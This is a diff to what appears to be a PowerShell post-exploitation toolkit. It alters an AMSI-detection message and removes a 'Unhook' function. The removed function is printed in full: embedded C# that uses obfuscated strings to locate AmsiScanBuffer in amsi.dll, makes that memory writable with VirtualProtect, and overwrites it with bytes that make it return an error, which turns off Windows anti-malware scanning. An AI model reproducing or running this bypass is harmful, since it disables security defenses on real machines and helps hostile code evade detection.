@@ -42,7 +42,7 @@ Function CheckArchitecture
     else {
         Write-Output "Unknown Architecture Detected"
     }
-    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Run Unhook-AMSI to unload Anti-Malware Scan Interface (AMSI)"} }
+    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Migrate to avoid the Anti-Malware Scan Interface (AMSI)"} }
 }
 Function Get-Proxy {
     Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
@@ -815,59 +815,6 @@ Function Get-AllFirewallRules($path) {
     } else {
         $Rules
     }
-}
-
-Function Unhook {
-
-$win32 = @"
-using System.Runtime.InteropServices;
-using System;
-public class Unhook
-{
-    [DllImport("kernel32")]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-    static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
-
-    public static void Disable()
-    {
-        var one = "i.dll";
-        var two = "a";
-        var three = "ms";
-        var dll = LoadLibrary(two + three + one);
-        if (dll == IntPtr.Zero)
-        {
-            return;
-        }
-        var four = "nBuffer";
-        var five = "Ams";
-        var six = "iSca";
-        var proc = GetProcAddress(dll, five + six + four);
-        if (proc == IntPtr.Zero)
-        {
-            return;
-        }
-        var n = new byte[] { 0xb8,  0x00, 0x00, 0x00, 0x02, 0xc3 };
-        UIntPtr dwSize = (UIntPtr) n.Length;
-        uint old = 0;
-        if (!VirtualProtect(proc, dwSize, 0x40, out old))
-        {
-            return;
-        }
-
-        Marshal.Copy(n, 0, proc, n.Length);
-        VirtualProtect(proc, dwSize, old, out old);
-    }
-
-}
-"@
-Add-Type $win32
-$ptr = [Unhook]::Disable()
 }
 
 $script:genurl=${function:GenerateURL}
